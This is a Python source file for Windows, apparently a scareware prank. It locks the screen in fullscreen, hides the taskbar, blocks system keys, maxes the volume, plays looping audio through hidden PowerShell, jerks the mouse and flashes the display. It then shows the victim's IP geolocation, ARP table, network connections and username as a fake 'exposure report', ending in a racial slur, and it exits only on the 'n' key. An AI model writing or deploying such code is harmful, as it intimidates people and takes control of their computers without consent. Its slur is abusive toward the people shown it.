import tkinter as tk
from PIL import Image, ImageTk
import pyautogui
import random
import threading
import time
import os
import keyboard
import ctypes
import requests
import subprocess
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# >>> SALIR CON LA TECLA N <<<

u32 = ctypes.windll.user32

def tb_set(v):
    try:
        h = u32.FindWindowW("Shell_TrayWnd", None)
        u32.ShowWindow(h, 5 if v else 0)
    except: pass

def vol_max():
    try:
        devs = AudioUtilities.GetSpeakers()
        iface = devs.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        vol = cast(iface, POINTER(IAudioEndpointVolume))
        vol.SetMasterVolumeLevelScalar(1.0, None)
    except: pass

class FinalRiskAudit:
    def __init__(self):
        self.win = tk.Tk()
        self.w, self.h = pyautogui.size()
        self.win.attributes('-fullscreen', True, '-topmost', True)
        self.win.config(bg="black", cursor="none")
        self.win.overrideredirect(True)
        self.run = True

        threading.Thread(target=self.play, args=("ejje.mp3",), daemon=True).start()
        threading.Thread(target=self.play, args=("escari.mp3",), daemon=True).start()

        try:
            r = requests.get('https://ipapi.co/json/').json()
            try: 
                arp = subprocess.check_output("arp -a", shell=True).decode('latin-1')[:250]
                net = subprocess.check_output("netstat -n", shell=True).decode('latin-1')[:300]
            except: 
                arp = "ARP_ERR"; net = "NET_ERR"

            logs = (
                f"--------------------------------------------------\n"
                f"[CRITICAL_EXPOSURE_REPORT]\n"
                f"REMOTE_ADDR:   {r.get('ip')}\n"
                f"ISP_PROVIDER:  {r.get('org')}\n"
                f"LOCATION:      {r.get('city')}, {r.get('region')}, {r.get('country_name')}\n"
                f"POSTAL_CODE:   {r.get('postal')}\n"
                f"COORDINATES:   {r.get('latitude')}, {r.get('longitude')}\n"
                f"TIME_ZONE:     {r.get('timezone')}\n"
                f"--------------------------------------------------\n"
                f"[LOCAL_NETWORK_TOPOLOGY]\n"
                f"{arp}\n"
                f"--------------------------------------------------\n"
                f"[ACTIVE_SOCKETS_DUMP]\n"
                f"{net}\n"
                f"--------------------------------------------------\n"
                f"USER_ID:       {os.getlogin()} | {os.environ['COMPUTERNAME']}\n"
                f"STATUS:        METADATA_BROADCAST_ONGOING\n"
                f"--------------------------------------------------"
            )
            final_text = "\nwomp womp NIGGA"
        except:
            logs = "DATA_SYNC_FAILED"
            final_text = ""

        try:
            path = os.path.dirname(os.path.abspath(__file__))
            img = Image.open(os.path.join(path, "jeje.jpg")).resize((self.w, self.h), Image.Resampling.LANCZOS)
            self.bg = ImageTk.PhotoImage(img)
            self.lbl_bg = tk.Label(self.win, image=self.bg, bg="black")
            self.lbl_bg.place(x=0, y=0, relwidth=1, relheight=1)
            
            self.text_frame = tk.Frame(self.win, bg="black", padx=30, pady=30)
            self.text_frame.place(x=20, y=40)

            self.txt = tk.Label(self.text_frame, text=logs, fg="#00FF41", bg="black", 
                               font=("Consolas", 10), justify="left")
            self.txt.pack(anchor="w")

            self.final_txt = tk.Label(self.text_frame, text=final_text, fg="#00FF41", bg="black", 
                                     font=("Consolas", 12, "bold"), justify="left")
            self.final_txt.pack(anchor="w", pady=(10, 0))
            
            self.fsh = tk.Label(self.win, bg="white")
        except: pass

        keyboard.add_hotkey('n', self.stop)
        keyboard.add_hotkey('N', self.stop)
        
        self.lock()
        self.win.after(10, self.force_focus)

        threading.Thread(target=self.m_move, daemon=True).start()
        threading.Thread(target=self.m_flash, daemon=True).start()
        
        vol_max()
        self.win.mainloop()

    def force_focus(self):
        if self.run:
            self.win.lift()
            self.win.attributes("-topmost", True)
            self.win.focus_force()
            u32.SetForegroundWindow(self.win.winfo_id())
            self.win.after(10, self.force_focus)

    def play(self, f):
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), f)
        cmd = (f'Add-Type -AssemblyName PresentationCore; '
               f'$p = New-Object system.windows.media.mediaplayer; '
               f'$p.open("{p}"); $p.Play(); '
               f'while($p.Position -ne $p.NaturalDuration) {{ Start-Sleep -ms 500 }}')
        while self.run:
            if os.path.exists(p):
                subprocess.run(["powershell", "-Command", cmd], creationflags=0x08000000)
            else: break

    def m_move(self):
        while self.run:
            x, y = random.randint(0, self.w), random.randint(0, self.h)
            pyautogui.moveTo(x, y, duration=0.03)

    def lock(self):
        tb_set(False)
        keys = ['windows', 'left windows', 'right windows', 'alt', 'tab', 'f4', 'esc', 'ctrl', 'menu', 'delete']
        for k in keys:
            try: keyboard.block_key(k)
            except: pass

    def m_flash(self):
        while self.run:
            self.fsh.place(x=0, y=0, relwidth=1, relheight=1)
            self.fsh.lift() 
            time.sleep(0.03)
            self.fsh.place_forget()
            self.text_frame.lift() 
            time.sleep(0.07)

    def stop(self, e=None):
        self.run = False
        tb_set(True)
        keyboard.unhook_all()
        subprocess.run(["taskkill", "/F", "/IM", "powershell.exe"], creationflags=0x08000000)
        self.win.destroy()
        os._exit(0)

if __name__ == "__main__":
    FinalRiskAudit()
